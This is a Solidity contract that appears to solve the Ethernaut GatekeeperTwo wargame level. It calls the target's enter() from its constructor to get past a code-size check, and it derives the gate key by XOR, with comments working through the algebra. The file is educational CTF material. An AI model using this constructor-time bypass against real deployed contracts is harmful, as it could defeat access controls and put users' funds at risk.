// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface GatekeeperTwo {
    function enter(bytes8) external;
}

contract HackGatekeeperTwo {
    
    // calling enter from constructor passes gateTwo modifier. Contract doesn't have code during contract construction.
    constructor(GatekeeperTwo gateAddress) {
        GatekeeperTwo gate = GatekeeperTwo(gateAddress);

        uint64 m = type(uint64).max;
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        // a ^ b = c
        // a ^ a = 0000000000000
        // a ^ a ^ b = b
        // 0 ^ b = b

            // a ^ key = m
        // a ^ a ^ key = key
        // a ^ m = key

        uint64 key = a ^ m; 
        gate.enter(bytes8(key));
    }
}
